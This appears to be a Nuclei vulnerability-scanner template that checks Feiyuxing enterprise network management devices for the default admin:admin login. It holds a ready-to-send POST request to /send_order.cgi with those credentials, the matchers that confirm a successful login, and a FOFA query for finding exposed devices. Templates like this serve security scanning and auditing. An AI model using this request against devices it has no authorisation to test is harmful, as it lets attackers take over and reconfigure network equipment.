http:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"msg":"ok"'
    - '"type":'
  - part: header
    type: word
    words:
    - hash_key=
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /send_order.cgi?parameter=login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    {"username":"{{username}}","password":"{{password}}"}

    '
id: feiyuxing-default-login
info:
  author: SleepingBag945
  description: 'Attackers can log in through admin:admin, check the system status,
    and configure the device.

    '
  metadata:
    fofa-query: "title=\"\u98DE\u9C7C\u661F\u4F01\u4E1A\u7EA7\u667A\u80FD\u4E0A\u7F51\
      \u884C\u4E3A\u7BA1\u7406\u7CFB\u7EDF\""
    max-request: 1
    verified: true
  name: Feiyuxing Enterprise-Level Management System - Default Login
  reference:
  - https://github.com/wushigudan/poc/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81.py
  severity: high
  tags: feiyuxing,default-login,iot
